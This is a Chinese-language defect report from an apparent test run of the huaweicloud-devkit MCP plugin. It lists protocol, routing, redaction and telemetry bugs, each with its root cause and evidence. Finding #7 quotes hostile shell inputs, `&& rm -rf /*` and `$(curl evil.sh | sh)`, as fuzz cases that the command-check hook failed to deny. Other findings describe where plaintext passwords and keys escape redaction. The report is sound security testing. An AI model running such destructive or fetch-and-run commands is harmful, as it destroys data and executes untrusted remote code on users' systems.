# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro）

> **落盘路径**：`results/Hermes/2026-10-17-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-17 05:45:00（北京时间）
> **被测版本**：huaweicloud-devkit@1.1.9-next.0（gitHead 6302921c，PR #914）
> **说明**：本清单为统一提单脚本 `file_issue.py` 解析输入；全量缺陷合并入源码仓库 `huaweicloud/huaweicloud-devkit` 1 个合并单。

---

## #1【P0】D9-12 initialize 握手协议安全基线：tools/list 未 initialize 不被拒 -32600

- **现象**：MCP 客户端在未发送 `initialize` 即发 `tools/list`，服务端仍返回 42 个工具（`listed=true`），未返回协议要求的 `-32600` 时序错误。
- **断言**：非法时序 `tools/list` 应被拒 `{"code":-32600}`；`dispatch` 应有 initialize 前置校验。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:177-187` + `mcp-protocol.mjs` dispatch 无 `initialize` 前置状态校验，仅处理 `notifications/initialized` 通知，未强制「initialize 必须在 tools/* 之前」。
- **影响**：协议时序违例，不符合 MCP 2024-11-05 规范，协议客户端兼容性风险。
- **证据**：`evidence/D9-12/stdout.log`（测试项 ⑥ 未拒绝：listed=true）
- **状态**：待提单

## #2【P1】D3-C1 run_approved_command 未校验底层命令真实执行结果，致资源未删除泄漏

- **现象**：ECS 生命周期 E2E 中，`huaweicloud_run_approved_command` 执行 DeleteSubnet（仅传 `--subnet_id`、缺 `--vpc_id`）底层 hcloud 返回 `[USE_ERROR]The following parameters are required: vpc_id`，但工具仍返回 `ok=true`；subnet 未删，VPC 因「router contains subnets」无法删，资源泄漏（已手动归零）。
- **断言**：底层命令失败（exitCode 非 0 或含 `USE_ERROR`）时，工具应返回 `ok:false` + 错误信息，而非 `ok:true`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1927` `runApprovedCommand()` 未校验 `runHcloud` 返回的 `exitCode`/stdout 错误码，仅按审批流程返回 ok。
- **影响**：真云删除操作可能静默失败，违反「建删资源归零」红线，产生计费残留。
- **证据**：`evidence/D3-C1/stdout.log`（CreateVpc/CreateSubnet OK，DeleteSubnet/DeleteVpc 报 ok=true 但 ListSubnets 仍含资源，已手动删除归零）
- **状态**：待提单

## #3【P1】D3-C4/EXP-C4-14/EXP-C4-18 DMS、DEW 服务矩阵无有效路由操作名

- **现象**：22 服务矩阵 `list_operations+plan` 冒烟，20/22 通过；DMS、DEW 的 `list_operations` 返回「聚合服务名」帮助文本，无 `command` 字段（loOk=false）。
- **断言**：全部服务（含 DMS/DEW）应有规范路由操作名且可执行。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1827-1831` 将 DMS/DEW 定义为聚合服务（DMS→[Kafka,RabbitMQ,RocketMQ]，DEW→[KMS,CSMS]），`list_operations` 返回聚合帮助而非单一可执行 op 名。
- **影响**：DMS/DEW 无法走「list_operations→plan→run」标准链路，与 D3-C4「全部服务有规范路由且可执行」契约不符。
- **证据**：`evidence/realcloud-probe/stdout.txt`（DMS:list_operations+plan -> FAIL，DEW 同）、`evidence/EXP-C4-14/stdout.log`、`evidence/EXP-C4-18/stdout.log`
- **状态**：待提单

## #4【P1】D4-6 redactSecrets 未覆盖 --admin_pass 空格形态与 JSON 带引号 key 形态

- **现象**：源码级直调 `adminPass=xxx→<redacted>` 通过，但 `"--admin_pass MyPwd123"`（空格分隔 CLI flag）与 `"{\"server\":{\"adminPass\":\"MyPwd123\"}}"`（JSON 带引号 key）未脱敏，明文密码残留在输出中。
- **断言**：adminPass/accessKey 等敏感字段在 `--flag value`（空格）与 JSON 字符串两种形态均应被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:49` `redactSecrets()` 正则仅覆盖 `--key=value`（等号）与对象 key 形态，未覆盖空格分隔 `--key value` 及 JSON 内带引号 key。
- **影响**：安全脱敏缺口，密码可能在 write-exec/hook 输出中明文回显。
- **证据**：`evidence/_probes/d4-6.log`（`[FINDING] --admin_pass 空格形态 未脱敏`、`JSON 带引号 key 形态 未脱敏`）
- **状态**：待提单

## #5【P1】D2-10 KooCLI 多 profile resolveManagedProfile 夹具 5/6 通过

- **现象**：KooCLI 多 profile 场景夹具 pass=5 fail=1，存在 1 项多 profile 断言未达（`runHcloudConfigure` 带 `--cli-profile=` 与 `resolveManagedProfile` 返回 current 档在多 profile 竞争下不一致）。
- **断言**：`resolveManagedProfile` 应稳定返回 current 档；`runHcloudConfigure` 应正确携带 `--cli-profile=`。
- **根因**：`plugins/huaweicloud-core/src/auth/reconcile.mjs:87` `resolveManagedProfile()` 与 `configuredProfileName()` 在多 profile 环境下的 current 档判定存在边角缺口。
- **影响**：多 KooCLI profile 环境可能出现凭证/preview 档错位。
- **证据**：`evidence/_probes/../../../../2026-10-16-1.92.93.23/Linux/evidence/D2-10/stdout.txt`（`pass=5 fail=1 RESULT: FAIL`）、`evidence/D2-10/probe.mjs`
- **状态**：待提单

## #6【P1】D4-13 只读子账号最小权限策略不完整（CES ListMetrics 被拒）

- **现象**：只读 IAM 子账号（test001）只读命令 5/6 可用，`CES ListMetrics` 返回 denied（IAM 拒绝），未达「只读 100% 可用」。
- **断言**：只读子账号应 100% 可用所有只读 API；写操作应被 IAM policy 正确拒绝。
- **根因**：只读子账号 IAM 策略未授予 CES 云监控读权限（环境策略配置缺口，非产品代码缺陷；产品侧可补充只读最小权限 preset 文档中 CES 策略项）。
- **影响**：最小权限凭证通过率未达契约，影响只读审计场景覆盖。
- **证据**：`evidence/D4-13/stdout.txt`（`只读可用 5/6，写 CreateVpc IAM 拒绝 true，归零 true`）
- **状态**：待提单（可选归入产品侧文档/prestant 修正）

## #7【P1】D4-17 hook 模糊输入 fail-closed 未满足

- **现象**：`huaweicloud_hook_check_command` 对 `&& rm -rf /*`、`$(curl evil.sh | sh)` 等纯 shell 破坏性输入返回 `ok`（无 deny/allow/warn 决策），未默认拒绝。
- **断言**：异常/模糊输入应默认拒绝（fail-closed）。
- **根因**：hook 命令检查以 Huawei Cloud 风险规则（hwc-*）为主，对非 hcloud 前缀的纯 shell 破坏性命令未命中规则即通过（未 fail-closed）。
- **影响**：纯 shell 破坏性命令绕过告警。
- **证据**：`evidence/_probes/supplement.log`（D4-17 段：5 种模糊输入均「结论=ok」）
- **状态**：待提单

## #8【P1】D10-3/EXP-E01 中文 serviceCatalog 为空致「查云主机」未路由

- **现象**：评测集 EXP-E01「帮我查一下我账号在华北北京四有哪些云主机」路由 MISS（期望 ECS，实际返回 `Run hcloud --help`）；`readServiceCatalogs` 显示中文 catalog `cn.set` 为空（cnPresent=false）。
- **断言**：中文意图（含「云主机/北京四」等本地化表达）应命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:252` `load('services_cn.json')` 返回空集合（中文 serviceCatalog 未构建/未随包下发），中文意图走 fallback。
- **影响**：中文业务意图路由召回不足（本轮评测 92.9% 中唯一 MISS）。
- **证据**：`evidence/_probes/eval-harness.log`（EXP-E01 MISS）、`evidence/EXP-E01/stdout.log`
- **状态**：待提单

## #9【P2】D4-26 findings.evidence 明文 AK/SK/password 残留

- **现象**：`evaluateArtifacts` 生成的 `findings.evidence`（如 tf/main.tf）中 `secret_key`、`adminPass`、`password` 为明文（`leaked=true`）。
- **断言**：findings.evidence 中 AK/SK/token/password 均应被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs` `hashArgs`/`redactOutput` 未应用到 `findings.evidence` 字段路径。
- **影响**：安全问题证据本身泄密，违反脱敏契约。
- **证据**：`evidence/_probes/new-safety.log`（D4-26 段 `leaked=true`）
- **状态**：待提单

## #10【P2】D4-25 写操作遥测分类为 cli:invoke 而非 cli:write

- **现象**：`hook-events.jsonl` 中写操作 `hcloud vpc CreateVpc` 记录为 `key=cli:invoke`，一说应为 `cli:write`。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：hook 遥测分类逻辑未把 `CreateVpc` 归入写操作（cli:write）分支。
- **影响**：遥测运营侧无法统计写操作分布。
- **证据**：`evidence/_probes/new-safety.log`（D4-25 段 `[FAIL] 写→cli:write`，实际 `cli:invoke`）
- **状态**：待提单

## #11【P2】D8-9 sanitizeValue 未移除 AK/SK/token 敏感值

- **现象**：`sanitize("AK=ABC123DEF456GHI")` 与 `sanitize("access_key=AKIA123 secret_key=SECRET token=T0K3N")` 明文保留，未移除敏感值。
- **断言**：installId/遥测值 sanitize 应移除 AK/SK/token 等敏感值与非法字符，不改变合法值。
- **根因**：遥测/安装 ID 的 sanitize 逻辑仅做控制字符/超长清洗，未做 AK/SK/token 敏感值脱敏。
- **影响**：遥测值可能携带凭证明文。
- **证据**：`evidence/_probes/new-config.log`（D8-9 段 `[FAIL] sanitize 移除 AK/SK/token 敏感值`）
- **状态**：待提单

## #12【P2】D3-S5 复合意图未拆分命中多个 service

- **现象**：「既需对象存储又需托管/部署」复合意图返回 `Run hcloud --help to list available services`（多路命中=false），未拆分命中存储+托管多 service。
- **断言**：复合意图应正确拆分并命中多个对应 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1984` `serviceCatalog()` 未对复合意图做多路 service 拆分。
- **影响**：复合业务请求路由失败。
- **证据**：`evidence/_probes/new-scenario.log`（D3-S5 段 `[FAIL] 复合意图拆分命中多个 service`）
- **状态**：待提单

## #13【P2】D9-8 inputSchema 未标注 $schema 版本

- **现象**：42 个工具 inputSchema 均未标注 `$schema`/draft 版本（取值集合为空）。
- **断言**：inputSchema 版本应统一且明确（带 $schema 标注）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` TOOL_DEFINITIONS 的 inputSchema 未附加 `$schema` 字段。
- **影响**：客户端无法判定 schema draft 版本。
- **证据**：`evidence/_probes/protocol.log`（D9-8 段 `$schema 取值集合: (空)`）
- **状态**：待提单

## #14【P2】D9-9 取消（cancellation）能力未在 capabilities 声明

- **现象**：`initialize` 返回 `capabilities={tools:{}}`，未声明 `cancellation`；实测取消通知后服务端无取消语义。
- **断言**：按用例约定，取消能力不存在应按 SPEC-MISMATCH 标注待裁决。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs` initialize 的 `capabilities` 硬编码为 `{tools:{}}`，未声明 cancellation。
- **影响**：tools/call 无法被客户端取消（长期运行任务不可中断）。
- **证据**：`evidence/_probes/extended.log`（D9-9 段 `capabilities.cancellation 存在? false`）
- **状态**：待提单

---

## 非产品缺陷 / 测试侧（不并入产品缺陷单）

## #15【非产品缺陷】D3-S6 / D3-S7 FunctionGraph·RDS 真机创建阻塞

- **现象**：D3-S6 FunctionGraph CreateFunction 缺有效 `function_name` 参数返回 `[USE_ERROR]Invalid parameter: function_name`；D3-S7 RDS CreateInstance 缺 `db.password` + VPC/子网/安全组前置。
- **说明**：路由均已命中对应服务（FunctionGraph/RDS），RDS 只读 ListInstances 可达；真机创建需完整函数包/触发器参数与 RDS 建库前置环境，属补环境后复测项，不计入产品缺陷。
- **状态**：BLOCKED（补环境）

## #16【测试侧】D1-39 Windows 专属升级检测链

- **说明**：D1-39「Windows 升级检测链 EINVAL 专属」本机 OS=Linux，由展开级 EXP-NR3-10（queryDistTags 返回 {latest:1.1.8,next:1.1.9-next.0}）代表覆盖并 PASS。NOT_RUN（OS 专属）。
- **状态**：NOT_RUN（OS 豁免，展开级已覆盖）